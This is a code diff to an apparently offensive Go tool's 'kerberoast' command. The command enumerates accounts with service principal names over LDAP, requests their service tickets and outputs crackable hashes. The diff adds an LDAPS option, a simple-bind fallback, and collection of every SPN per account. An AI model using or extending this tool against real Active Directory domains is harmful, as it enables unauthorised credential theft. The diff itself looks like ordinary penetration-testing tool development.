@@ -19,6 +19,7 @@ func init() {
 	var domain string
 	var dcIp string
 	var useLdap bool
+	var useLdapSecure bool
 	var ldapUser string
 	var ldapPassword string
 	var ldapSizeLimit int
@@ -139,15 +140,27 @@ func init() {
 					return err
 				}
 
-				// TODO : support LDAPS
-				if err := ldapClient.Connect(dcIp, 389, false); err != nil {
+				port := 389
+				if useLdapSecure {
+					port = 636
+				}
+				if err := ldapClient.Connect(dcIp, port, useLdapSecure); err != nil {
 					return err
 				}
 				defer ldapClient.Close()
 
 				// We set the correct credentials in the `PreRunE` function
 				if err := ldapClient.AuthenticateWithDomainAccount(domain, ldapUser, ldapPassword); err != nil {
-					return err
+					fmt.Printf("cannot authentication to ldap server with NTLM bind: %s\n", err)
+
+					if !strings.Contains(ldapUser, "@") {
+						ldapUser = fmt.Sprintf("%s@%s", ldapUser, domain)
+					}
+
+					if err := ldapClient.AuthenticateWithAccount(ldapUser, ldapPassword); err != nil {
+						fmt.Printf("cannot authentication to ldap server with simple bind: %s\n", err)
+						return fmt.Errorf("cannot authenticate to ldap server with NTLM and simple bind")
+					}
 				}
 
 				// TODO: search account with RC4 enabled (or AES128/256)
@@ -169,7 +182,9 @@ func init() {
 					fmt.Printf("    distinguishedName   : %s\n", entry["distinguishedName"])
 					fmt.Printf("    servicePrincipalName: %s\n", entry["servicePrincipalName"])
 
-					targets = append(targets, spnTarget{username: entry["sAMAccountName"][0], spn: entry["servicePrincipalName"][0]})
+					for _, spn := range entry["servicePrincipalName"] {
+						targets = append(targets, spnTarget{username: entry["sAMAccountName"][0], spn: spn})
+					}
 				}
 			}
 
@@ -192,7 +207,6 @@ func init() {
 					}
 				} else {
 					hashes += fmt.Sprintf("%s\n", tgs.HashString(target.username, target.spn))
-					fmt.Printf("%s\n", tgs)
 				}
 			}
 
@@ -216,6 +230,7 @@ func init() {
 	commandAddKerberosDomainFlags(kerberoastCmd, &dcIp, &socks)
 	commandAddDomainUserFlagsWithTicket(kerberoastCmd, &domain, &username, &password, &key, &ticket)
 	kerberoastCmd.Flags().BoolVarP(&useLdap, "ldap", "l", false, "Search targets on LDAP with username and password")
+	kerberoastCmd.Flags().BoolVarP(&useLdapSecure, "ldap-secure", "", false, "Use LDAPS")
 	commandAddLDAPFlags(kerberoastCmd, &ldapUser, &ldapPassword, &ldapSizeLimit)
 	commandAddKerberosETypeFlagWithDefaultValue(kerberoastCmd, &enctype, "rc4")
 	kerberoastCmd.Flags().StringVarP(&spn, "spn", "", "", "SPN to roast")
